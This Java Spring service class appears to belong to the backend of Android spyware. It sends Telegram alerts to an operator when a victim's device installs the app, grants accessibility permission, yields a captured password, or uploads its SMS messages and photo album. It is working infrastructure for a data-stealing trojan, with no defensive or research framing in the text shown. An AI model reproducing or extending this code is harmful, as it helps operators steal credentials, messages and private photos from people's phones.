package io.renren.modules.app.service.impl;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;

import io.renren.modules.app.entity.TelegramBotEntity;
import io.renren.modules.app.handler.TelegramNotificationHandler;
import io.renren.modules.app.mapper.TelegramBotMapper;
import io.renren.modules.app.service.TelegramBotService;
@Service
public class TelegramBotServiceImpl  extends ServiceImpl<TelegramBotMapper, TelegramBotEntity> implements TelegramBotService {
	

	
	@Autowired
	private TelegramNotificationHandler telegramNotificationHandler;

	
	@Override
	public void newDeviceNotify(String pkg, String deviceId) {
		String message = "✅ 新设备安装成功!\\n📈 请关注后台数据!";
		telegramNotificationHandler.sendNotificationAsync(pkg,deviceId, message);
		
	}
	@Override
	public void accessibilityNotify(String pkg, String deviceId) {
		String message = "✅ 无障碍授权成功!\\n📈 请关注后台数据!";
		telegramNotificationHandler.sendNotificationAsync(pkg,deviceId, message);
	}

	@Override
	public void passwordNotify(String pkg, String deviceId, String type) {
		String message =String.format("✅ [%s]获取成功\n📈 请关注后台数据!",type);
		telegramNotificationHandler.sendNotificationAsync(pkg,deviceId, message);
	}

	@Override
	public void smsNotify(String pkg, String deviceId) {
		String message = "✅ 短信数据上传成功\n📈 请关注后台数据!";
		telegramNotificationHandler.sendNotificationAsync(pkg,deviceId, message);
	}

	@Override
	public void albumNotify(String pkg, String deviceId) {
		String message = "✅ 相册数据上传成功\n📈 请关注后台数据!";
		telegramNotificationHandler.sendNotificationAsync(pkg,deviceId, message);
	}


  
}
